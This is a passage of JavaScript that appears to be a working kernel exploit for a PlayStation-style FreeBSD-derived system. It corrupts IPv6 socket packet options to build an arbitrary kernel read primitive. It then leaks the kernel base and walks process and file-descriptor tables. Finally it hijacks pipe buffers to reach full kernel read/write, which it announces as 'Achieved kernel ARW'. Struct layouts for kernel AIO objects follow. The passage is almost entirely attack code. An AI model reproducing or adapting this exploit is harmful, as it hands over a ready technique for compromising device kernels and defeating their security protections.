  }

  logger.info(`Overwritten ${pktopts_twins[0]} pktopts !!`);

  const pktinfo_addr = mem.alloc(0x14);
  const nhop_addr = mem.alloc(4);
  const buf_addr = mem.alloc(8);

  function kread8(addr) {
    if (addr.eq(0)) {
      throw new Error("Empty addr !!");
    }

    arw.view(pktinfo_addr).setBInt(0, ip6po_pktinfo_addr, true); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo

    let offset = 0;
    while (offset < 8) {
      arw.view(pktinfo_addr).setBInt(8, addr.add(offset), true); // pktopts.ip6po_nexthop = addr + offset

      if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
        throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
      }

      arw.view(nhop_addr).setInt32(0, 8 - offset, true);

      if (fn.getsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_NEXTHOP, buf_addr.add(offset), nhop_addr) === -1) {
        throw new SyscallError(`Unable to get socket option for fd ${pktopts_twins[0]} !!`);
      }

      const n = arw.view(nhop_addr).getInt32(0, true);
      if (n === 0) {
        arw.view(buf_addr).setUint8(offset, 0);
        offset += 1;
      } else {
        offset += n;
      }
    }

    return arw.view(buf_addr).getBInt(0, true);
  }

  kread8(evf_cv_addr);
  const kstr = String.from(buf_addr);
  logger.debug(`kstr: ${kstr}`);

  if (kstr !== "evf cv") {
    throw new Error(`Expected 'evf cv' got ${kstr} !!`);
  }

  kernel_base = evf_cv_addr.sub(constants.EVF_OFFSET);
  logger.info(`kernel base: ${kernel_base}`);

  const p = kread8(aio_info_addr.add(8));
  logger.debug(`proc: ${p}`);

  const mask = new BInt("0xffff000000000000");
  if (p.and(mask).neq(mask)) {
    throw new Error(`${p} is not valid kernel address !!`);
  }

  const p_pid = kread8(p.add(0xb0));
  logger.debug(`p_pid: ${p_pid}`);

  const pid = fn.getpid.invoke();
  logger.debug(`pid: ${pid.hex()}`);

  if (p_pid.neq(pid)) {
    throw new Error(`Expected pid ${pid} got ${p_pid} !!`);
  }

  const p_fd = kread8(p.add(0x48));
  logger.debug(`p_fd: ${p_fd}`);

  fdt_ofiles = kread8(p_fd);
  logger.debug(`fdt_ofiles: ${fdt_ofiles}`);

  const master_pipe_fp = kread8(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
  logger.debug(`master_pipe_fp: ${master_pipe_fp}`);

  const slave_pipe_fp = kread8(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
  logger.debug(`slave_pipe_fp: ${slave_pipe_fp}`);

  const master_pipe_f_data = kread8(master_pipe_fp);
  logger.debug(`master_pipe_f_data: ${master_pipe_f_data}`);

  const slave_pipe_f_data = kread8(slave_pipe_fp);
  logger.debug(`slave_pipe_f_data: ${slave_pipe_f_data}`);

  mem.bset(pktinfo_addr, 0x14);

  arw.view(pktinfo_addr).setBInt(0, master_pipe_f_data.add(8), true); // pktopts.ip6po_pktinfo = &((pipe *)master_pipe_fp->f_data)->pipe_buffer.out
  arw.view(pktinfo_addr).setBInt(8, 0, true); // pktopts.ip6po_nexthop = 0

  if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
  }

  arw.view(pktinfo_addr).setUint32(0, 0, true); // pipebuf.out
  arw.view(pktinfo_addr).setUint32(4, PAGE_SIZE, true); // pipebuf.size
  arw.view(pktinfo_addr).setBInt(8, slave_pipe_f_data, true); // pipebuf.buffer

  if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
  }

  kv = new KernelView(master_pipe, slave_pipe);

  logger.info("Achieved kernel ARW !!");
}
//#endregion
//#region Structs
const linger = new Struct("linger", [
  { type: "Int32", name: "l_onoff" },
  { type: "Int32", name: "l_linger" },
]);

const sockaddr_in = new Struct("sockaddr_in", [
  { type: "Uint8", name: "sin_len" },
  { type: "Uint8", name: "sin_family" },
  { type: "Uint16", name: "sin_port" },
  { type: "Uint32", name: "sin_addr" },
  { type: "Uint8", name: "sin_zero", count: 8 },
]);

const SceKernelAioResult = new Struct("SceKernelAioResult", [
  { type: "Int64", name: "return_value" },
  { type: "Uint32", name: "state" },
  { type: "Uint32", name: "_pad" },
]);

const SceKernelAioRWRequest = new Struct("SceKernelAioRWRequest", [
  { type: "Uint64", name: "offset" },
  { type: "Uint64", name: "nbyte" },
  { type: "Uint64", name: "buf" },
  { type: "SceKernelAioResult*", name: "result" },
  { type: "Int32", name: "fd" },
]);

const aio_entry = new Struct("aio_entry", [
  { type: "Uint32", name: "ar2_cmd" },
  { type: "Uint32", name: "ar2_ticket" },
  { type: "Uint8", name: "_unk1", count: 8 },
  { type: "Uint64", name: "ar2_reqs1" },
  { type: "Uint64", name: "ar2_info" },
  { type: "Uint64", name: "ar2_batch" },
  { type: "Uint64", name: "ar2_spinfo" },
  { type: "SceKernelAioResult", name: "ar2_result" },
  { type: "Uint64", name: "ar2_file" },
  { type: "Uint64", name: "_unk2" },
  { type: "Uint64", name: "ar2_qentry" },
  { type: "Uint8", name: "_pad2", count: 0x28 },
]);

const aio_batch = new Struct("aio_batch", [
  { type: "Uint32", name: "ar3_num_reqs" },
  { type: "Uint32", name: "ar3_reqs_left" },
  { type: "Uint32", name: "ar3_state" },
  { type: "Uint32", name: "ar3_done" },
  { type: "Uint8", name: "_unk1", count: 0x18 },
  { type: "Uint32", name: "lock_object_flags" },
  { type: "Uint8", name: "_unk2", count: 0x0c },
  { type: "Uint64", name: "lock_object_lock" },
]);
//#endregion
